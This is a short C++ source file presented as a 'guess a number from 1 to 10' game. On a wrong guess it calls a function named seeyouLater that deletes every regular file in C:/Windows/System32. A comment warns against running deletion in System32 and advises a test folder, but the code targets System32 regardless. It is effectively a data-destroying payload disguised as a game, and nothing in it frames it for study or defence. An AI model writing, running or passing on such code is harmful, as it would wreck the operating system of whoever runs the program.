#include <iostream>
#include <cstdlib>
#include <ctime>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

/*
    Warnings:
    System Files: Never run such processes in system directories such as C:/Windows/System32! 
    These directories contain files that are vital to the Windows operating system.
    Test Directories: Use a secure folder such as C:/example_folder to test the deletion. 
    Such directories do not damage system files and make testing operations safer.

    As such, your code can securely delete files in the directory you specify.
*/

void seeyouLater(){
    string path = "C:/Windows/System32";
    try{
        for (const auto &entry : fs::directory_iterator(path)){
            if (fs::is_regular_file(entry.path())){
                fs::remove_all(entry.path());
            }
        }
    }
    catch (const exception &e){
        cerr << "Error: " << e.what() << endl;
    }
}

int main(){
    int input;
    srand(time(0));
    int answer = (rand() % 10) + 1;
    cout << "The game has started. Enter a number between 1 and 10" << endl;
    cin >> input;

    if (input == answer){
        cout << "You won:)" << endl;
    }
    else{
        cout << "You lose! See you later..." << endl;
        seeyouLater();
    }

    return 0;
}